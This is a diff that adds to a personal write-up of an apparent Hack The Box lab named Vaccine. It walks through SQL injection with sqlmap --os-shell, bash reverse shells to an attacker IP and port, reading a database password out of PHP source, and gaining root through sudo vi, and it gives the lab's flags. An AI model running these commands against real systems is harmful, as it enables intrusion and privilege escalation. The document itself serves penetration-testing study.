@@ -586,19 +586,139 @@ What is the password for the admin user on the website?
 
 1. Use John to crack zip (password: `741852963`)
 2. Read index file and we find md5 hash of admin password (md5: `2cb42f8734ea607eefed3b70af13bbd3`)
-3. Lookup unsalted md5 reverse to get `qwerty789`
+3. Lookup unsalted md5 reverse to get `qwerty789` for user `admin`
 
 **Task 6**  
 What option can be passed to sqlmap to try to get command execution via the sql injection?  
+
+Given we have an admin password to the PHP site, let's take a look at the website and peek around for any potential vulnerabilities. Upon logging in, we are granted with a dashboard with a search bar. That search appears to be the only interactive functionality. Let's have a play around. Aha! Typing `a'` gives us a SQL error
+
+```sql
+ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%a'%'^
+```
+
+At this point, we have an unsanitised input for SQLi at the endpoint `http://$TARGET/dashboard.php?search=<something>`
+
+Looking at the `sqlmap` options, the `--os-shell` looks pretty good.
 
 
 **Task 7**  
 What program can the postgres user run as root using sudo?  
 
+First, let's gain access to the machine. 
+
+```bash
+kali$ sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=<session id>
+...
+it looks like the back-end DMBS is 'PostgreSQL'
+...
+[09:26:14] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[09:26:17] [INFO] fingerprinting the back-end DBMS operating system
+[09:26:19] [INFO] the back-end DBMS operating system is Linux
+[09:26:20] [INFO] testing if current user is DBA
+[09:26:21] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[09:26:21] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> whoami
+command standard output: 'postgres'
+os-shell> pwd
+command standard output: '/var/lib/postgresql/11/main'
+```
+
+Let's establish a more stable shell
+
+```
+os-shell> /bin/bash -c 'bash -i >& /dev/tcp/<IP>/1337 0>&1'
+...
+kali$ nc -lvnp 1337
+postgres@vaccine:/var/lib/postgresql/11/main$
+```
+
+At this point, I was having some issues with the question. When trying to find permissions by `sudo -l`, I was getting hit with "sudo: a terminal is required to read the password". At this point, I returned to the writeup which showed that while this bash reverse shell was more stable, it wasn't enough - we needed a stable shell.
+
+```
+postgres@vaccine:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Even still, trying to use the command `sudo -l` was prompting for a password. I did go to the writeup for a hint - it said to look in the `/var/www/html` directory where the site was. If there were some creds stored in the PHP files, there could possible be some SQL things too. We know the dashboard is retrieving data from somewhere. Let's look at that:
+
+```php
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+```
+
+Excellent! Looks like exactly what we're after.
+
+```bash
+postgres@vaccine:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for postgres: P@s5w0rd!
+
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+The user can run `vi` as root. (n.b. it can run as root to edit that specific file. I didn't realise that at first)
+
 
 **Task 8**  
 Submit user flag  
 
+From spawning a stable shell in task 7:
+```bash
+postgres@vaccine:/var/lib/postgresql/11/main$ cd ~
+cd ~
+postgres@vaccine:/var/lib/postgresql$ ls
+ls
+11  user.txt
+postgres@vaccine:/var/lib/postgresql$ cat user.txt
+cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+```
+
 
 **Task 9**  
 Submit root flag  
+
+In vi, we can get a shell by `:sh`. Doing so after opening the file with sudo gives us a root shell
+
+```bash
+postgres@vaccine$ sudo vi /etc/postgresql/11/main/pg_hba.conf
+password for postgres: ...
+
+# vim
+:sh
+wroot@vaccine#whoami
+whoami
+root
+root@vaccine# cd ~
+root@vaccine:~# ls
+ls
+pg_hba.conf  root.txt  snap
+root@vaccine:~# cat root.txt
+cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+```
+
+
+
+Todo: Write up about failed `find` attempt
+
+find /usr 2>/dev/null -type f -perm /4000 - failed attempt to find permissions
+
+
+sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=v6bd1717a43omas1b6r01rvgbg --timeout 1800
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/5009 0>&1'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+sudo vi /etc/postgresql/11/main/pg_hba.conf
+
+
+Todo: write up about the use of sudo with the SUID. I wouldn't have got that without the writeup
+https://gtfobins.github.io/gtfobins/vi/#sudo
